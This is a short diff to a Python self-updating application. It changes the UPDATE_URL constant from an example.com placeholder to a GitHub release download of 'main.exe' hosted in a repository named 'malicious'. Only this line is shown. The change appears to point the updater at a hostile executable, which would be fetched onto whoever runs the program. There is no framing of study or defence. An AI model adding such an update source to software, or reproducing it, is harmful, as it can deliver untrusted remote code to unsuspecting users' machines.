@@ -8,7 +8,7 @@ import sqlite3
 from threading import Thread
 
 # URL where the latest .exe is hosted (this will be your update server URL)
-UPDATE_URL = "https://example.com/latest_version.exe"  # Replace with your actual update URL
+UPDATE_URL = "https://github.com/DeveloperPrabit/malicious/releases/download/v1.0.5/main.exe"  # Replace with your actual update URL
 
 # Current version of the running application
 CURRENT_VERSION = "1.0.0"  # Update this with your actual versioning
